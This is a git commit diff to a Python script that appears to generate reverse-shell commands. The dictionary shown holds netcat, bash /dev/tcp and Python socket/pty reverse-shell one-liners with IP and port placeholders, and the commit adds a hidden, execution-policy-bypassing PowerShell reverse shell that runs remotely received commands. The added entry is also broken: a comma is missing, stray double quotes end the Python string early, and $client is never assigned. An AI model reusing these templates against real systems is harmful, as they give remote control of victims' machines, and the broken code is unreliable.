386d2e21e1f6fbfd0553bc12f34465e06e0c475d
Rishiraj <rishirajbehki11@gmail.com>
2021-05-24 18:56:56 +0530

    Added powershell

--- main.py
+++ main.py
@@ -18,6 +18,7 @@ reverseShellTemplates = {
 	"netcat": "nc (ip) (port) -e (sh)",
 	"bash": "bash -i >& /dev/tcp/(ip)/(port) 0>&1",
 	"python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"(ip)\",(port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"(sh)\")'"
+	"powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"(ip)\",(port));$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 }
 
 x = buildPrompt(getKeys(reverseShellTemplates), "What type of reverse shell do you want?")
